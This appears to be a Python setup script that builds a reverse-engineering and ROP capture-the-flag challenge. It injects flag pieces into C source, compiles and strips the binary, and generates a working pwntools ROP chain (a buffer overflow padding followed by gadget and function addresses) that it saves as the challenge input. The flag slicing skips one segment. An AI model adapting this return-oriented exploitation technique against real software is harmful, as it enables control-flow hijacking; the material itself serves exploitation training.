import subprocess
import os
import sys
                    # chals_out/chal_name/team_name so 3
sys.path.insert(1, os.path.join(sys.path[0], '../../..'))
from libchals import *

from pwn import *
# junk code generation
write_junk_body("main.c", 13)

# replace flags in source file
f = open("flag.txt", "r")
flag=f.readline()
flag1=flag[:10]
flag2=flag[10:20]  
flag3=flag[30:40]  
flag4=flag[40:50]  
flag5=flag[50:60]  
flag6=flag[60:]  
print(flag6)
replace_text("main.c", "FLAG_PART_1", flag1)
replace_text("main.c", "FLAG_PART_2", flag2)
replace_text("main.c", "FLAG_PART_3", flag3)
replace_text("main.c", "FLAG_PART_4", flag4)
replace_text("main.c", "FLAG_PART_5", flag5)
replace_text("main.c", "FLAG_PART_6", flag6)
replace_text_random_hash("main.c", "FLAG_WRONG")



subprocess.call("make")

# we generate the rop
elf = ELF("reverse_rop")
rop = ROP(elf)
FLAG1 = elf.symbols['flag1']
FLAG2 = elf.symbols['flag2']
FLAG3 = elf.symbols['flag3']
FLAG6 = elf.symbols['flag6']
XOR = elf.symbols['xor']
XOR2 = elf.symbols['xor2']
XOR3 = elf.symbols['xor3']
POP_ONCE = (rop.find_gadget(['pop ebx', 'ret']))[0] 

padding = b'A' * 28

exploit = padding + p32(FLAG1) + p32(FLAG2) + p32(POP_ONCE) + p32(0xAABBCCD2)
exploit += p32(XOR) + p32(FLAG3) + p32(POP_ONCE) + p32(0xAABBCCD1) + p32(FLAG3) 
exploit += p32(POP_ONCE) + p32(0xAABBCCD2) + p32(XOR2) + p32(FLAG3) +p32(POP_ONCE) 
exploit += p32(0xAABBCCD5) + p32(XOR3) + p32(FLAG6) + p32(POP_ONCE) + p32(0xBBCCDDE9) + p32(0xBBCCDDE3)

# rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()

# strip it after the ropchain building so they don't have the symbols but we do
subprocess.call(["strip", "reverse_rop"])


os.remove("main.c")
os.remove("Makefile")
os.remove("setup.py")
os.remove("flag.txt")

